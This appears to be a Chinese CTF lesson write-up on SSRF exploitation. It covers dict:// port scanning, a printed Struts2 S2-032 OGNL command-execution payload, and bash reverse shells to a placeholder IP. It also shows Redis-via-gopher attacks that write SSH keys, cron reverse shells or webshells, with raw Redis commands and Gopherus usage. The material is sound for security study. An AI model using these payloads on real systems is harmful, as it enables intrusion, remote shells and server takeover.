### 题目分析与信息收集

![](img/2d8715ee0d745979fdce789ebbdb757c_51.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_52.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_53.png)

首先，我们面对的是一个存在SSRF漏洞的页面，它允许我们输入一个URL并返回其内容。我们的目标是获取内网的flag。

**第一步是测试支持的协议。** 我们尝试使用`dict`协议探测一个已知的公网服务器端口（如22端口）。

```bash
dict://<公网IP>:22
```

从服务器端的监听回显可以确认，目标服务器确实使用`curl`发起了对我们指定端口的连接，这说明`dict`协议可用。

**第二步是探测内网开放端口。** 既然`dict`协议可用，我们就可以用它来探测目标服务器内网开放的端口。手动测试效率低下，我们可以使用Burp Suite的Intruder模块进行端口爆破。

![](img/2d8715ee0d745979fdce789ebbdb757c_55.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_57.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_59.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_61.png)

1.  抓取使用`dict`协议探测端口的请求包。
2.  将端口号设置为爆破变量（Payload），范围设置为1-65535。
3.  根据响应长度或状态码判断端口是否开放。

爆破结果可能显示开放了以下端口：`22` (SSH), `3306` (MySQL), `5002`, `8080`, `23005`。

![](img/2d8715ee0d745979fdce789ebbdb757c_63.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_65.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_67.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_73.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_74.png)

**第三步是识别服务并寻找漏洞。** 我们重点分析`8080`端口。通过`dict`协议访问`dict://127.0.0.1:8080`，返回的信息可能提示这是一个Apache服务。进一步使用`http`协议访问`http://127.0.0.1:8080`，从返回的页面特征（如访问`/index.action`）可以判断这是一个**Struts2**框架的应用。

### 漏洞利用与GetShell

识别出Struts2框架后，我们可以尝试利用其历史漏洞。例如，通过查找公开的PoC，我们发现目标存在**S2-032**漏洞。

对应的命令执行PoC格式如下（以执行`whoami`命令为例）：
```http
POST /index.action HTTP/1.1
...（其他头部）
Content-Type: application/x-www-form-urlencoded

![](img/2d8715ee0d745979fdce789ebbdb757c_82.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_84.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_86.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_88.png)

method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=whoami&pp=\\A&ppp=%20&encoding=UTF-8
```

发送该PoC后，如果回显为`root`，则证明命令执行成功，并且我们拥有最高权限。

**最后一步是获取稳定Shell。** 由于目标在内网，我们需要让它主动连接我们的公网服务器（反弹Shell）。我们可以在公网服务器监听一个端口（如`4444`），然后在SSRF漏洞点利用Struts2的命令执行功能，执行反弹Shell命令。

![](img/2d8715ee0d745979fdce789ebbdb757c_90.png)

例如，使用bash反弹Shell：
```bash
bash -i >& /dev/tcp/<你的公网IP>/4444 0>&1
```
将上述命令进行URL编码后，替换PoC中的`cmd`参数值，发送请求即可在公网服务器上获得一个来自内网Struts2服务器的交互式Shell。

![](img/2d8715ee0d745979fdce789ebbdb757c_92.png)

### Redis未授权访问利用方法

![](img/2d8715ee0d745979fdce789ebbdb757c_107.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_109.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_111.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_112.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_114.png)

Redis未授权访问是一个高危漏洞，攻击者可以直接向Redis服务写入数据。结合SSRF，我们可以通过`gopher`协议向这个内网Redis服务发送攻击载荷。以下是几种常见的利用方式：

![](img/2d8715ee0d745979fdce789ebbdb757c_116.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_118.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_120.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_122.png)

**1. 写入SSH公钥**
   前提是目标Redis服务以root权限运行，并且存在`/root/.ssh/`目录。
   *   首先生成SSH密钥对：`ssh-keygen -t rsa`。
   *   将公钥（`id_rsa.pub`）内容写入一个文件（如`key.txt`）。
   *   构造一个能通过Redis命令将公钥写入`/root/.ssh/authorized_keys`文件的Payload。
   *   使用`gopher`协议发送该Payload。

![](img/2d8715ee0d745979fdce789ebbdb757c_124.png)

**2. 写入计划任务反弹Shell**
   这是更通用的方法，适用于任何可执行cron的Linux系统。
   *   构造Redis命令，将反弹Shell的命令写入`/var/spool/cron/root`（或`/var/spool/cron/crontabs/root`）文件。
   *   例如，写入内容为`* * * * * bash -i >& /dev/tcp/<公网IP>/4444 0>&1`的计划任务。
   *   使用`gopher`协议发送。

![](img/2d8715ee0d745979fdce789ebbdb757c_126.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_128.png)

**3. 写入WebShell**
   如果知道目标Web服务器的绝对路径，并且Redis有写权限，可以直接写入一句话木马。
   *   构造Redis命令，将PHP一句话木马写入Web目录（如`/var/www/html/shell.php`）。
   *   使用`gopher`协议发送。

![](img/2d8715ee0d745979fdce789ebbdb757c_130.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_132.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_134.png)

### Gopher协议Payload构造

![](img/2d8715ee0d745979fdce789ebbdb757c_136.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_138.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_140.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_141.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_143.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_145.png)

`gopher`协议发送Redis命令的格式为：`gopher://<目标IP>:6379/_<经过编码的Redis命令>`。

![](img/2d8715ee0d745979fdce789ebbdb757c_146.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_148.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_150.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_152.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_154.png)

关键在于`<经过编码的Redis命令>`的构造。原始Redis命令序列（例如写入计划任务）可能如下：
```
set xx "\n\n* * * * * bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n\n"
config set dir /var/spool/cron/
config set dbfilename root
save
```
我们需要对这个命令序列进行以下处理：
1.  将每一条命令按照Redis的协议格式进行封装（例如，`*3\r\n$3\r\nSET\r\n$2\r\nxx\r\n$...`）。
2.  将整个封装后的字符串进行URL编码。
3.  将编码后的字符串作为`gopher`协议URL的路径部分。

![](img/2d8715ee0d745979fdce789ebbdb757c_156.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_157.png)

![](img/2d8715ee0d745979fdce789ebbdb757c_159.png)

为了方便，我们可以使用现成的工具（如`Gopherus`）来生成攻击Payload。
```bash
python gopherus.py --exploit redis
```
工具会交互式地让我们选择利用类型（反弹Shell/写WebShell），并输入所需参数（如IP、端口、Web路径等），然后自动生成可直接用于`gopher`协议请求的Payload字符串。

### 利用流程总结
1.  **确认Gopher协议支持**：首先测试`gopher`协议是否被目标服务器的SSRF漏洞支持。
2.  **生成Payload**：使用工具或手动构造针对内网Redis服务的攻击Payload。
3.  **发送Payload**：通过SSRF漏洞点，以`gopher://127.0.0.1:6379/_<生成的Payload>`的形式发送请求。
4.  **等待连接**：如果写入的是计划任务或WebShell，则在公网服务器监听相应端口或访问WebShell地址。

## 总结

本节课中我们一起学习了两个SSRF漏洞实战题目的完整解题思路。

![](img/2d8715ee0d745979fdce789ebbdb757c_161.png)

*   对于**第一题**，我们掌握了从协议探测、端口扫描、服务识别到利用特定框架漏洞（Struts2）进行命令执行并最终反弹Shell的完整链条。
*   对于**第二题**，我们深入了解了如何将SSRF与内网其他服务漏洞（如Redis未授权访问）相结合。重点学习了通过`gopher`协议构造复杂攻击请求的方法，以及利用Redis写入SSH密钥、计划任务或WebShell的多种技术。
